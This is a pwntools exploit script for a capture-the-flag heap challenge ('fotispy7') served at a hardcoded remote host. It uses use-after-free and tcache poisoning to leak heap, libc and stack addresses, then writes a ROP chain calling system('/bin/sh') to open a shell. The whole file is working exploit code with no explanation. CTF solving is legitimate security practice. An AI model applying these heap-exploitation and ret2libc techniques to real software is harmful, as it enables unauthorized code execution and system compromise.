#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5197
HOST = "52.59.124.14"
exe = context.binary = ELF('./fotispy7_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000018FE
            # opt 10
            brva 0x0000000000001227

            # malloc playlist
            brva 0x000000000000167F
            brva 0x00000000000016BF

            # malloc song
            brva 0x00000000000019BA
            brva 0x00000000000019EF

            # free playlist
            brva 0x000000000000194C

            # free song
            brva 0x0000000000001FE5

            # edit song
            brva 0x0000000000001CB6
            brva 0x0000000000001BA9

            brva 0x0000000000001ED0

            # opt 0
            brva 0x00000000000011EE
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def create_user(username, password):
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'password: ', password)

def edit_user(choice, username = b'test', password = b'123'):
    p.sendlineafter(b'Choice: ', str(1))
    p.sendlineafter(b'[P]assword: ', choice)

    if choice == b'U':
        p.sendlineafter(b'username: ', username)
    else:
        p.sendlineafter(b'password: ', password)

def create_playlist(name, data):
    p.sendlineafter(b'Choice: ', str(2))
    p.sendlineafter(b'playlist: ', name)
    p.sendlineafter(b'description: ', data)

def edit_playlist(choice, name = b'name', data = b'data'):
    p.sendlineafter(b'Choice: ', str(3))
    p.sendlineafter(b'[I]nfo: ', choice)

    if choice == b'N':
        p.sendlineafter(b'name: ', name)
    else:
        p.sendlineafter(b'description: ', data)

def show_playlist():
    p.sendlineafter(b'Choice: ', str(4))

def free_playlist():
    p.sendlineafter(b'Choice: ', str(5))

def create_song(title, album, artist):
    p.sendlineafter(b'Choice: ', str(6))
    p.sendlineafter(b'song: ', title)
    p.sendlineafter(b'song: ', album)
    p.sendlineafter(b'song: ', artist)

def edit_song(idx, choice, title = b'title', album = b'album', artist = b'artist'):
    p.sendlineafter(b'Choice: ', str(7))
    p.sendlineafter(b'edit: ', str(idx))
    p.sendlineafter(b'a[R]tist: ', choice)

    if choice == b'T':
        p.sendlineafter(b'song: ', title)
    elif choice == b'L':
        p.sendlineafter(b'song: ', album)
    else:
        p.sendlineafter(b'song: ', artist)

def show_song():
    p.sendlineafter(b'Choice: ', str(8))

def free_song(idx):
    p.sendlineafter(b'Choice: ', str(9))
    p.sendlineafter(b'delete: ', str(idx))

# VARIABLE


# PAYLOAD
create_user(b'test', b'123')

create_playlist(b'a'*8, b'b'*8)
free_playlist()
show_playlist()
p.recvuntil(b'Name: ')
heap_leak = u64(p.recv(5) + b'\0'*3)
heap_base = heap_leak << 12
log.info("Heap base: " + hex(heap_base))

create_song(b'1'*8, b'2'*8, b'3'*8)
create_song(b'1'*8, b'2'*8, b'3'*8)
# free_song(0)

create_playlist(b'a'*8, b'b'*8)
target = (heap_base + 0x20) ^ ((heap_base + 0x2a0) >> 12)
free_playlist()
edit_playlist(b'N', b'a'*8)
free_playlist()
edit_playlist(b'N', p64(target))
target = (heap_base + 0x2a0) ^ ((heap_base + 0x2a0) >> 12)
create_playlist(p64(target), b'b'*8)
create_playlist(p64(0) + p32(0) + p32(2) + p16(0) + p8(7), b'\0'*0xc0 + p64(heap_base + 0x3d0) + p64(0)*2 + p64(heap_base + 0x2a0))
create_playlist(b'a'*8, b'b'*8)
free_playlist()
edit_playlist(b'N', p64(0)*2)
free_playlist()
show_playlist()
p.recvuntil(b'Name: ')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x1e7c40
log.info("Libc base: " + hex(libc.address))
pop_rdi = 0x000000000002a145 + libc.address
ret = pop_rdi + 1
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

target = (libc.sym.environ - 0x18) ^ ((heap_base + 0x2a0) >> 12)
edit_playlist(b'N', p64(target))
create_playlist(b'a'*8, b'b'*8)
payload = flat(
    0, 0,
    )
payload += p32(0x131)
create_playlist(payload, b'b'*8)
p.sendlineafter(b'Choice: ', str(10))
p.recvuntil(b'[0x0018] ')
stack_leak = int(p.recvuntil(b'\n', drop=True), 16)
log.info("Stack leak: " + hex(stack_leak))

target = (stack_leak - 0x128) ^ ((heap_base + 0x3d0) >> 12)
edit_song(0, b'T', p64(target))

create_song(b'1'*8, b'2'*8, b'3'*8)
payload = flat(
    b'a'*8,
    pop_rdi,
    bin_sh,
    ret,
    system
    )
create_song(payload, b'2'*8, b'3'*8)

p.sendlineafter(b'Choice: ', str(0))

p.interactive()